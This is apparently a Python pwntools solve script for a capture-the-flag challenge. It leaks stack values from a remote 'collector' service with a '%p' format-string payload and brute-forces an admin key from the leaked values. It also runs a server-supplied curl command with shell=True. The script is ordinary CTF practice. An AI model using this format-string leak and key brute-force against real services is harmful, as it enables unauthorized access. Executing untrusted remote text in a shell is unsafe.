from pwn import *
import subprocess
import struct

HOST = 'ctf.csd.lol'
PORT = 7777
BINARY = './collector'

context.log_level = 'debug'

def solve():
    p = remote(HOST, PORT)

    initial_data = p.recv(4096, timeout=3)
    
    if b'proof of work' in initial_data:
        lines = initial_data.decode().split('\n')
        cmd = ""
        for line in lines:
            if line.strip().startswith('curl'):
                cmd = line.strip()
                break
        
        if cmd:
            try:
                solution = subprocess.check_output(cmd, shell=True).strip()
                print(f"[+] PoW Solution: {solution.decode()}")
                p.sendline(solution)
                p.recvuntil(b"cmd: ", timeout=5)
            except Exception as e:
                print(f"[-] PoW Error: {e}")
                return
    else:
        if b'cmd: ' not in initial_data:
            p.recvuntil(b"cmd: ")

    # --- LEAK DATA ---
    print("[*] Sending Format String payload...")
    
    # Send a bit more %p and use | as delimiter
    payload = b"%p|" * 45
    
    p.sendline(b"write")
    p.recvuntil(b"data: ")
    p.sendline(payload)
    
    p.recvuntil(b"cmd: ")
    p.sendline(b"read")
    
    p.recvuntil(b"data:\n")
    leak_line = p.recvline().decode().strip()
    print(f"[+] Leak received: {leak_line[:50]}...")
    
    values = leak_line.split('|')
    
    # --- FOUND KEY (AGGRESSIVE STRATEGY) ---
    potential_keys = []
    
    print("[*] Analyzing Stack...")
    for i, val in enumerate(values):
        if not val or val == '(nil)': continue
        if val.startswith('0x7f'): continue # Skip Stack/Libc addresses
        
        try:
            int_val = int(val, 16)
            
            # Key is a 32-bit int, so the maximum is 0xFFFFFFFF (4 billion)
            # However, on a 64-bit stack, it may appear as a larger number
            
            # CASE 1: Number fits entirely (less than 32-bit max)
            if int_val <= 0xFFFFFFFF:
                # Filter out numbers that are too small (like 0, 1, 5) unless desperate
                if int_val > 100: 
                    potential_keys.append(int_val)
            
            # CASE 2: Number is packed with another (Packed in 64-bit)
            else:
                # Lower 32-bits
                low_32 = int_val & 0xFFFFFFFF
                # Upper 32-bits
                high_32 = (int_val >> 32) & 0xFFFFFFFF
                
                if low_32 > 100: potential_keys.append(low_32)
                if high_32 > 100: potential_keys.append(high_32)

        except:
            pass

    # Remove duplicates while preserving order
    unique_keys = []
    [unique_keys.append(x) for x in potential_keys if x not in unique_keys]
    
    print(f"[*] Found {len(unique_keys)} potential keys. Starting brute-force...")
    print(f"[*] Key list: {unique_keys}")

    # --- TRY KEYS ---
    for key in unique_keys:
        # Send admin command
        p.sendline(b"admin")
        
        # Handle potential line drift
        try:
            p.recvuntil(b"auth: ", timeout=1)
        except:
            p.clean()
        
        p.sendline(str(key).encode())
        
        response = p.recvline().decode()
        
        if "denied" in response:
            # If wrong, server returns to cmd, need to read and discard the cmd line
            p.recvuntil(b"cmd: ")
        else:
            print("\n" + "="*30)
            print(" [!!!] FOUND FLAG [!!!]")
            print("="*30)
            print(response)
            try:
                print(p.recvall(timeout=2).decode())
            except:
                pass
            return

    print("[-] Tried all keys but failed. Could be due to lag or offset change.")
    p.close()

if __name__ == "__main__":
    solve()